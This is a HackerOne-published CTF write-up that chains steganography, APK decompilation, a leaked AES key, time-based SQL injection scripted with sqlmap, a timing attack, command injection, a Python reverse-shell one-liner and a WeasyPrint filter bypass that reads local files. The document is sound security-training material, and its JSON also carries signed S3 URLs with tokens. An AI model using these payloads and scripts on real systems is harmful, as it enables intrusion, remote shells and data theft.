{"id":514415,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTQ0MTU=","url":"https://hackerone.com/reports/514415","title":"0xc0ffee's 50M-CTF Submission","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2019-03-24T06:09:50.720Z","submitted_at":"2019-03-24T06:09:50.720Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"0xc0ffee","url":"/0xc0ffee","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/51ry5i8y3si500ijz9uzx8b15knt/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c?response-content-disposition=inline%3B%20filename%3D%22me.png%22%3B%20filename%2A%3DUTF-8%27%27me.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150838Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7ea9ea6c12176a4b1d3cf7a0f4774aa6859fa6b5922e3827d15e0de3ddf3e923"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:57:12.592Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:57:07.745Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Introduction\n\nThis CTF was extremely fun and truly original. It covered different kinds of very interesting challenges where completing one challenge led to another one, like some sort of quest with various levels.\n\nThank you [Cody](https://twitter.com/daeken) and [HackerOne](https://hackerone.com) for giving 5 hackers the opportunity to go to Vegas, test their skills, and most of all, learn!\n\n## Stage 1 - It all started with a picture\n\nHackerOne [announced](https://twitter.com/Hacker0x01/status/1100543680383832065) the CTF so I downloaded the two pictures from that tweet and started inspecting them for clues or flags. I began by simply looking at the pictures for interesting patterns, codes or anything obvious, then proceeded to using zSteg on the picture with the H1 flag:\n\n```bash\nzsteg -a image_with_binary_and_flag.png | grep h1\n\nb1,rgb,lsb,yx       .. zlib: data=\"https://bit.do/h1therm\", offset=5, size=22\n```\n\nThe https://bit.do/h1therm URL was hiding in the `zlib` data.\n\n\n## Stage 2 - Secrets\n\nVisiting the URL would redirect to a Google Drive share hosting an APK file: `h1thermostat.apk`. I loaded the HackerOne Thermostat application in Android Studio's device emulator to get a feel of the features then decompiled it using JADX.\n\nWhen I began inspecting the Java code, I noticed the URL http://35.243.186.41 in the `PayloadRequest()` method:\n\n```java\npublic PayloadRequest(JSONObject jSONObject, final Listener\u003cString\u003e listener) throws Exception {\n  super(1, \"http://35.243.186.41/\", new ErrorListener() {\n      public void onErrorResponse(VolleyError volleyError) {\n          listener.onResponse(\"Connection failed\");\n        }\n    });\n    this.mListener = listener;\n    this.mParams.put(\"d\", buildPayload(jSONObject));\n}\n```\nThis led me to believe that the application had some sort of interaction with that URL by sending JSON objects in the `d` parameter.\n\nSending a GET request to the URL returned a `405 Method Not Allowed` response. The application would only accept POST requests and the response was always different, had the same length and was always base64 encoded:\n\n```bash\ncurl -X \"POST\" http://35.243.186.41/ -d \"h1-702\"\n\n4Y72K2/1OSU3Le8MgMK5SyB/TqwuRWrfo36ZejjELd2BSbvM8ffNnM1jz9inlyN4\n```\nSince base64 decoding the response always returned an encrypted string, I moved back to source code analysis. There clearly appeared to be encryption going on in the `parseNetworkResponse()` method. In fact, the requests sent from the server and the mobile application used AES encryption with CBC mode and PKCS5 padding:\n\n```java\nprotected Response\u003cString\u003e parseNetworkResponse(NetworkResponse networkResponse) {\n       try {\n           Object decode = Base64.decode(new String(networkResponse.data), 0);\n           Object obj = new byte[16];\n           System.arraycopy(decode, 0, obj, 0, 16);\n           Object obj2 = new byte[(decode.length - 16)];\n           System.arraycopy(decode, 16, obj2, 0, decode.length - 16);\n           Key secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, \"AES\");\n           AlgorithmParameterSpec ivParameterSpec = new IvParameterSpec(obj);\n           Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n           instance.init(2, secretKeySpec, ivParameterSpec);\n           JSONObject jSONObject = new JSONObject(new String(instance.doFinal(obj2)));\n           if (jSONObject.getBoolean(\"success\")) {\n               return Response.success(null, getCacheEntry());\n           }\n           return Response.success(jSONObject.getString(\"error\"), getCacheEntry());\n       } catch (Exception unused) {\n           return Response.success(\"Unknown\", getCacheEntry());\n       }\n}\n\n```\n\nLooking carefully at the code, I noticed that in order for the request to be valid, the initialization vector (IV) had to be prepended to the encrypted request.\n\nBut wait, there's more! The code was leaking the secret key:\n\n```java\nKey secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, \"AES\");\n```\n\nAnd while it is not much of a secret, the IV was 16 bytes:\n\n```java\nObject obj = new byte[16];\n```\n\nThe `LoginActivity` class contained the remaining code required to understand the application's logic. Looking at its `attemptLogin()` method, it was clear that I needed to send the server a JSON object:\n\n```java\n...\njSONObject.put(\"username\", username);\njSONObject.put(\"password\", password);\njSONObject.put(\"cmd\", \"getTemp\");\n...\n```\n\nI quickly wrote a Python script to encrypt a JSON object using the secret key obtained from the mobile application:\n\n```python\nfrom Crypto.Cipher import AES\nimport base64\nimport requests\n\nblocksize = 16\npkcs5Pad = lambda s: s + (blocksize - len(s) % blocksize) * chr(blocksize - len(s) % blocksize)\npkcs5Unpad = lambda s : s[0:-ord(s[-1])]\n\nclass EncryptionH1:\n\n    def __init__(self):\n        ENCRYPTION_KEY = [56,79,46,106,26,5,-27,34,59,-128,-23,96,-96,-90,80,116]\n        ENCRYPTION_KEY = ''.join(map(lambda x: chr(x % 256), ENCRYPTION_KEY))\n        self.cryptKey = ENCRYPTION_KEY\n        self.ivkey = \"b\"*16\n\n    def encrypt(self, string):\n        string = pkcs5Pad(string)\n        cipher = AES.new(self.cryptKey, AES.MODE_CBC, self.ivkey)\n        return base64.b64encode(self.ivkey+cipher.encrypt(string))\n\n    def decrypt(self, string):\n        string = base64.b64decode(string)\n\tcipher = AES.new(self.cryptKey, AES.MODE_CBC, self.ivkey)\n\n        return pkcs5Unpad(cipher.decrypt( string))\n\nif __name__== \"__main__\":\n    a = EncryptionH1()\n    encrypt = a.encrypt(r'''{\"username\":\"admin\",\"password\":\"test\",\"cmd\":\"getTemp\"}''')\n    print \"%s\" % encrypt\n    r = requests.post(\"http://35.243.186.41\",data={'d':encrypt})\n    decrypt = a.decrypt(r.text)\n    print \"%s\" % decrypt\n```\n\nThe Python script encrypts a JSON object, prepends the IV to the encrypted string and base64 encodes the final string. \n\nAfter a few login attempts with various passwords, I obtained access to the application with the `admin:password` credentials and received the following response:\n\n```json\n{\"temperature\": 73, \"success\": true}\n```\n\n## Stage 3 - Exfiltration\n\nAfter authenticating successfully and testing the `getTemp` and `setTemp` commands, I realized that I was probably in a rabbit hole, so I stepped back to test the login function.\n\nThe application returned an error when a single quote was injected in the value of the `username` field:\n\n```json\n{\"username\":\"'\",\"password\":\"password\",\"cmd\":\"getTemp\"}\n```\n\nHowever, with two single quotes, no errors were returned. The payload `' OR sleep(10)-- ` was then injected and a 10 second delay occurred. A couple of tests later, I concluded that I was dealing with a time-based blind SQL injection. \n\nIn order to speed things up, I wanted to automate the attack to see what was hiding in the database. To do so, I wrote a SQLmap tamper script that would encrypt and encode the SQLi payloads:\n\n```python\nimport base64\nfrom Crypto.Cipher import AES\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOWEST\n\ndef encrypt(text):\n    blocksize = 16\n    pkcs5Pad = lambda s: s + (blocksize - len(s) % blocksize) * chr(blocksize - len(s) % blocksize)\n    text = pkcs5Pad(text)\n    ENCRYPTION_KEY = [56,79,46,106,26,5,-27,34,59,-128,-23,96,-96,-90,80,116]\n    ENCRYPTION_KEY = ''.join(map(lambda x: chr(x % 256), ENCRYPTION_KEY))\n    iv = 'b'*16\n    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)\n    return base64.b64encode(iv+cipher.encrypt(text))\n\ndef tamper(payload, **kwargs):\n    return encrypt(r'''{\"username\":\"%s\",\"password\":\"\",\"cmd\":\"getTemp\"}''' % payload)\n```\nI executed SQLmap and left it running as there was a lot of content to exfiltrate:\n\n```bash\nsqlmap -r sql.txt --tamper=./tamper_script.py --dump --technique=T\n```\n\nThe `sql.txt` file contained the request needed to be processed by SQLmap:\n\n```\nPOST / HTTP/1.1\nHost: 35.243.186.41\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n\nd=*\n```\n\n{F450899}\n\n\nIn the database dump, there was a database named `flitebackend` with the `devices` and `users` tables. \n\n- The `users` table contained the username and hashed password of the user that I previously discovered. \n\n- The `devices` table contained 150 entries with IP addresses.\n\nI created a list with those IPs and used Nmap to scan them:\n\n```\nnmap -iL list.txt -T4\n```\n`104.196.12.98` was up and port 80 was open!\n\n## Stage 4 - Time is precious\n\nThere was a login page on http://104.196.12.98 which got me stuck for quite some time.\n\nThe `login.js` script was generating a 64 byte hash of the username and password when sending a login request:\n\n```html\nPOST / HTTP/1.1\nHost: 35.243.186.41\nContent-Type: application/x-www-form-urlencoded\n\nhash=e8765a4952a4f5d74b43e35d8fed6a0221c6877fba60a251aabde752f5ed13d8\n```\n\nAuthentication requests with the username `admin` and `f` or `h` as the password were taking quite longer to process than other login attempts. I also noticed that login attempts with the `admin:f` and `admin:h` credentials were both generating a hash starting with the `f9` characters.\n\nSince some login attempts were taking more time than others to process, I was pretty sure I was dealing with a **timing attack**.\n\nA few hours down the road, I realized that there were a few requirements for this attack to work:\n\n- The hash had to be 64 bytes\n\n- The hash had to contain a specific set of alphanumeric characters =\u003e `[a-f0-9]`\n\n- The brute-force had to be executed for every 2 bytes. So, in order to notice a time increase, we need to find the next 2 correct bytes, and so on until we find the right 64 byte hash.\n\nA quick Python script did the trick:\n\n```python\nimport requests\n\nwith open (\"list.txt\",\"r\") as file:\n  for line in file:\n    data = {\"hash\":\"f9\"+line.rstrip()+\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"}\n    r = requests.post(\"http://104.196.12.98\",data).elapsed.total_seconds()\n    print \"Time taken: \"+str(r)+\" for \"+line.rstrip()\nfile.close()\n```\n\nThe `list.txt` file used by the script contained a pre-generated list of all the 2 byte combinations of `[a-f0-9]`. On a few occasions, there was some network latency that was causing inconsistencies in the responses and would've led me to false positives. For that particular reason, I decided to run the attack in a semi-automated fashion - the script allowed me to manually inspect if the time variation was legitimate before jumping to the next 2 bytes.\n\nIf a request took an extra 500-515 milliseconds to return the response, then I knew which 2 valid characters were next in the hash:\n\n```\nTime taken: 3.018276 for a0\nTime taken: 3.022713 for a1\nTime taken: 3.018442 for a2\nTime taken: 3.018941 for a3\nTime taken: 3.517988 for a4      =\u003e a4 took an extra 500ms\nTime taken: 3.018825 for a5\n```\nAfter a little while, I obtained the valid hash to login successfully:\n\n`f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`\n\n{F450897}\n\n## Stage 5 - Interesting Parameters\n\nThe **FliteThermostat Admin** portal presented two functionalities: **Temperature control** and **Check for updates**.\n\nLooking at the source code of the admin page, there was a commented out reference to `/diagnostics`. When I visited the endpoint, a `403 Forbidden` error was always returned, which kept me very busy trying to bypass it.\n\nHowever, the **Check for updates** feature on the `/update` endpoint caught my attention:\n\n```\nConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nI instantly thought of an SSRF attack since it looked like the server was trying to connect to `update.flitethermostat` on port 5000 and the time taken for the request to complete was around 3 seconds. \n\nI quickly identified the `port` parameter and was able to control the port the server was possibly trying to reach:\n\n`GET /update?port=xxx`\n\nBut I also wanted to control the host as all the requests seemed like they were sent to `update.flitethermostat`. So, I tried to connect the dots:\n\n- I was on `/update` and had control over the `port` parameter.\n\n- I had to find a parameter that would control the host the server was possibly connecting to.\n\nThat's when I started thinking of new parameters. I made a list of words like `update`, `host`, `hostname`, `set`, `get` and combined them with characters like `-` and `_`. Using the list of combined words, I found the `update_host` parameter.\n\nHowever, it didn't seem like the `update_host` parameter did much in terms of having control over the host. In fact, there was no sign of SSRF or XSPA when pointing it to localhost or to my VPS.\n\nLater on, I determined that there was no input sanitization and that the input was actually used in an unsafe way by the server which led to command injection:\n\n`GET /update?port=22\u0026update_host=localhost%26%26echo%20$(id)` =\u003e `localhost\u0026\u0026echo $(id)`\n\n```\nConnecting to http://localhost and downloading update manifest\n...\n...\n...\nCould not connect\nuid=0(root) gid=0(root) groups=0(root):22/\n```\nGetting a shell on the server was possible with a Python reverse shell one-liner:\n\n```bash\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"MY_VPS\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n## Stage 6 - Tunnels\n\nI was root on `172.28.0.2` and thought the CTF was over. However, I wanted to do a bit of recon on this box, so I used Nmap to scan the internal network and this is when the `172.28.0.3` host was discovered:\n\n```bash\nnmap -sn 172.28.0.0/24 -T4\n```\n\nI quickly set up a multi-hop SSH tunnel in order to communicate with `172.28.0.3:80` and to proxy the traffic with Burp Suite.\n\nOn my local machine:\n\n```bash\nssh -L 8888:127.0.0.1:8444 50mctf@MY_VPS\n```\nOn the `172.28.0.2` machine: \n\n```bash\nssh -v -o PubkeyAuthentication=no -o PreferredAuthentications=password -o GatewayPorts=yes -fN -R *:8444:172.28.0.3:80 50mctf@MY_VPS\n```\nBrowsing to `localhost:8888` successfully displayed the web application hosted on `172.28.0.3:80`:\n\n{F450898}\n\n## Stage 7 - Conversion\n\nBy inspecting the source code of the homepage, there was a commented out reference to `/invoices/new`.\nThat endpoint hosted a functionality that allowed unauthenticated users to generate HTML invoices and convert them to PDF files.\n\nThe request to generate an HTML invoice looked like this:\n\n`GET /invoices/preview?d=%7B%22companyName%22%3A%22Acme%20Tools%22%2C%22email%22%3A%22accounting%40acme.com%22%2C%22invoiceNumber%22%3A%220001%22%2C%22date%22%3A%222019-04-01%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D`\n\nURL decoded:\n```json\n{\"companyName\":\"Acme Tools\",\"email\":\"accounting@acme.com\",\"invoiceNumber\":\"0001\",\"date\":\"2019-04-01\",\"items\":[[\"1\",\"\",\"\",\"10\"]],\"styles\":{\"body\":{\"background-color\":\"white\"}}}\n```\n\nThe request to generate a PDF file from the HTML was the same and only the endpoint was different:\n\n`GET /invoices/pdfize?d=%7B%22companyName%22%3A%22Acme%20Tools%22%2C%22email%22%3A%22accounting%40acme.com%22%2C%22invoiceNumber%22%3A%220001%22%2C%22date%22%3A%222019-04-01%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D`\n\nI edited the `styles` JSON array to reference an external image with the `background-image` CSS property and successfully received an HTTP request coming from the server that was trying to fetch the image during the HTML to PDF conversion:\n\n```\nUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n\n104.196.12.98 - - [17/Mar/2019 18:52:30] \"GET / HTTP/1.1\" 200 -\n```\n\nSo, based on the user-agent, [WeasyPrint's](https://weasyprint.org/) rendering engine was used to convert HTML code to PDF files. It was also possible, with this CSS injection, to load local images hosted on the server by using the `file:///` scheme:\n\n`file:///usr/share/pixmaps/debian-logo.png`\n\n## Stage 8 - Filters, filters and more filters\n\nAt this point, I wanted to inject iframe, object or embed attributes to load sensitive local files since the rendering was made server-side but all attempts were filtered by the application.\n\nI remembered a [blog post](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/) where [Ziot](https://twitter.com/bbuerhaus) and [NahamSec](https://twitter.com/NahamSec) were able to bypass an XSS filter in a JSON object by prepending their payload with a semi-colon.\n\nI used that idea to successfully inject `\u003c` and `\u003e` in the `styles` JSON array:\n\n```json\n{\"companyName\":\"test\",\"email\":\"test@test.com\",\"invoiceNumber\":\"001\",\"date\":\"\",\"items\":[[\"1\",\"s\",\"s\",\"10\"]],\"email\":\"\",\"styles\":{\"test\":{\";\u003c\u003e\":\"\"}}}\n```\n\nI could inject `\u003c` and `\u003e` but I had to close out the `\u003cstyle\u003e` attribute before injecting other attributes. However, even though the filter was bypassed, a second filter was stripping out the following sequence:\n\n`\u003c/anything_here\u003e`\n\nA little bypass was required to fool the filter:\n\n`;\u003c\\/\u003c/s\u003estyle\u003e`\n\nThe `\u003c/s\u003e` was stripped out and `\u003c/` was joined with `style\u003e` to finally get `\u003c/style\u003e`:\n\n```html\n  \u003cstyle\u003e\n    ...\n    test {\n      : \u003c/style\u003e;\n    }\n    ...\n```\n\n## Stage 9 - Success!\n\nDespite the fact that I was able to inject `iframe`,`embed` and `object` attributes, they were unfortunately not displaying the contents of internal files after the conversion.\n\nAfter reading the [WeasyPrint documentation](https://weasyprint.readthedocs.io/en/stable/index.html) and its source code on GitHub, I realized that it was also possible to include [attachments](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link) in PDF files and that WeasyPrint could process them:\n\nSnippet of WeasyPrint's [html.py](https://github.com/Kozea/WeasyPrint/blob/master/weasyprint/html.py#L318):\n```python\nreturn dict(title=title, description=description, \n            generator=generator,keywords=keywords, \n            authors=authors,created=created,\n            modified=modified,attachments=attachments)\n```\n\nI remembered that the **FliteThermostat Admin** application's files were located under the `/app/` directory. Following the same logic, I tried to extract the `/app/main.py` file from this host:\n\n`GET /invoices/pdfize?d=%7B%22companyName%22%3A%22%22%2C%22email%22%3A%22%22%2C%22invoiceNumber%22%3A%22%22%2C%22date%22%3A%22%22%2C%22items%22%3A%5B%5B%221%22%2C%22s%22%2C%22s%22%2C%2210%22%5D%5D%2C%22email%22%3A%22%22%2C%22styles%22%3A%7B%22test%22%3A%7B%22%3B%3C%5C%2F%3C%2Fs%3Estyle%3E%3Clink%20rel%3Dattachment%20href%3D%5C%22file%3A%2F%2F%2Fapp%2Fmain.py%5C%22%2F%3E%22%3A%22%22%7D%7D%7D`\n\nURL decoded:\n\n```json\n{\"companyName\":\"\",\"email\":\"\",\"invoiceNumber\":\"\",\"date\":\"\",\"items\":[[\"1\",\"s\",\"s\",\"10\"]],\"email\":\"\",\"styles\":{\"test\":{\";\u003c\\/\u003c/s\u003estyle\u003e\u003clink rel=attachment href=\\\"file:///app/main.py\\\"/\u003e\":\"\"}}}\n```\n\nThe PDF's size in the response was larger! I downloaded the PDF and extracted the attachment with binwalk:\n\n```bash\nbinwalk -e document.pdf\n```\n\nOne of the extracted files contained the `main.py` script announcing the end of the road for the CTF with the winning string! `c8889970d9fb722066f31e804e351993`\n\n{F450900}\n\n## Impact\n\nThanks for reading! :)","original_report_id":null,"original_report_url":null,"attachments":[{"id":450897,"file_name":"Admin-2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/897/aef1535c6701ef8a1462563eee78bedceeccf6c7/Admin-2.png?response-content-disposition=attachment%3B%20filename%3D%22Admin-2.png%22%3B%20filename%2A%3DUTF-8%27%27Admin-2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150838Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b89b9c535fa586224dac97f821c30c6a600054b9671c9a86c97b207df60189cb","file_size":28056,"type":"image/png"},{"id":450898,"file_name":"Accounting-2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/898/e2f0d942b25d4917a73cec571a956c2ce66db54d/Accounting-2.png?response-content-disposition=attachment%3B%20filename%3D%22Accounting-2.png%22%3B%20filename%2A%3DUTF-8%27%27Accounting-2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150838Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=14ad77d0a2c828ebfcd461236facf6685d20ee48eb01b286bc4a78ad04d36d11","file_size":49812,"type":"image/png"},{"id":450899,"file_name":"sqlmap-tamper-h1-2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/899/e4577c9462e4320cd27d8b1cacfeaea9a7b9b589/sqlmap-tamper-h1-2.png?response-content-disposition=attachment%3B%20filename%3D%22sqlmap-tamper-h1-2.png%22%3B%20filename%2A%3DUTF-8%27%27sqlmap-tamper-h1-2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150838Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4